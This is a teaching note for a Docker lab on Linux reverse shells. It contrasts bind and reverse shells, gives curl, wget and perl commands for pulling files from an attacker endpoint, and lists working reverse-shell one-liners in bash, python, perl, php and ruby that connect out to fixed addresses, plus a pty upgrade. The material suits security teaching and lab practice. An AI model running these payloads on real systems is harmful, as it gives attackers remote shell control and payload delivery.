@@ -1,0 +1,182 @@
+                      ____________________________
+
+                       LINUX PRIVILEGE ESCALATION
+                          Linux Reverse Shells
+
+                            Leonardo Tamiano
+                      ____________________________
+
+
+Table of Contents
+_________________
+
+1. Docker Setup
+2. Reverse Shell vs Bind Shell
+.. 1. Why Reverse Shells are Better
+3. File Transfer Commands
+4. Spawning a Reverse Shell
+.. 1. bash
+.. 2. python
+.. 3. perl
+.. 4. php
+.. 5. ruby
+5. Refs
+
+
+1 Docker Setup
+==============
+
+  - First we build the image and start the container
+    ,----
+    | docker build -t reverse-shell-lab .
+    | docker run -td --name reverse-shell-lab --rm reverse-shell-lab
+    `----
+
+  - Execute a shell within the docker environment
+    ,----
+    | docker exec -it reverse-shell-lab "/bin/bash"
+    `----
+
+
+2 Reverse Shell vs Bind Shell
+=============================
+
+  When we obtain `code execution' on a vulnerable system, it is useful
+  to spawn a `shell' that can be controlled through a remote connection.
+
+  To do this there are two main techniques:
+
+  - `Bind Shell'
+
+    The attacker forces the vulnerable compromised server to open a port
+    and to listen for incoming connections.
+
+    ,----
+    | Attacker Machine ------> Compromised System
+    `----
+
+    The compromised system acts as a server, while the attacker machine
+    acts a client.
+
+  - `Reverse Shell'
+
+    The attacker forces the vulnerable compromised system to initiate a
+    connection to the attacker machine.
+
+    ,----
+    | Compromised System ------> Attacker Machine
+    `----
+
+    The attacker machine now acts as the server, with a public IP on
+    which it listens for incoming connections. The compromised system
+    instead acts as a client.
+
+
+2.1 Why Reverse Shells are Better
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Since using reverse shells the connection is outbound, network-wise it
+  is more difficult to protect your system from reverse shell
+  connections.
+
+  That is, it is typically OK to connect to the public internet, while
+  it is more dangerous to open a port in your network infrastructure to
+  listen for incoming connections.
+
+  In both cases however the idea is to obtain *remote control over a
+  shell process*.  This can be really dangerous for the security of a
+  system.
+
+
+3 File Transfer Commands
+========================
+
+  First we open a web server on the attacker machine
+  ,----
+  | python3 -m http.server 1337
+  `----
+
+  Using `curl'
+
+  ,----
+  | curl -X GET http://<ATTACKER-ENDPOINT>/<FILE-TO-TRANSFER> -o <OUTPUT-FILE>
+  `----
+
+  ----------------------------------------------------------------------
+
+  Using `wget'
+
+  ,----
+  | wget http://<ATTACKER-ENDPOINT>/<FILE-TO-TRANSFER> -O <OUTPUT-FILE>
+  `----
+
+  ----------------------------------------------------------------------
+
+  Using `perl'
+
+  ,----
+  | perl -e 'use File::Fetch;$url="http://<ATTACKER-ENDPOINT>/<FILE-TO-TRANSFER>";$ff=File::Fetch->new(uri => $url);$file=$ff->fetch() or die $ff->error;'
+  `----
+
+
+4 Spawning a Reverse Shell
+==========================
+
+4.1 bash
+~~~~~~~~
+
+  reverse shell payload
+  ,----
+  | bash -c "bash -i >& /dev/tcp/172.17.0.1/4321 0>&1"
+  `----
+
+
+4.2 python
+~~~~~~~~~~
+
+  reverse shell payload
+  ,----
+  | python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  `----
+
+  shell upgrade
+  ,----
+  | python3 -c 'import pty; pty.spawn("/bin/bash")'
+  `----
+
+
+4.3 perl
+~~~~~~~~
+
+  reverse shell payload
+  ,----
+  | perl -e 'use Socket;$i="172.17.0.1";$p=4321;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  `----
+
+
+4.4 php
+~~~~~~~
+
+  reverse shell payload
+  ,----
+  | php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+  `----
+
+
+4.5 ruby
+~~~~~~~~
+
+  reverse shell payload
+  ,----
+  | ruby -rsocket -e'exit if fork;c=TCPSocket.new("172.17.0.1","4321");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+  `----
+
+
+5 Refs
+======
+
+  reverse shell bash payload explanation
+  - <https://www.youtube.com/watch?v=OjkVep2EIlw>
+
+  Reverse Shell Cheatsheets
+  - <https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php>
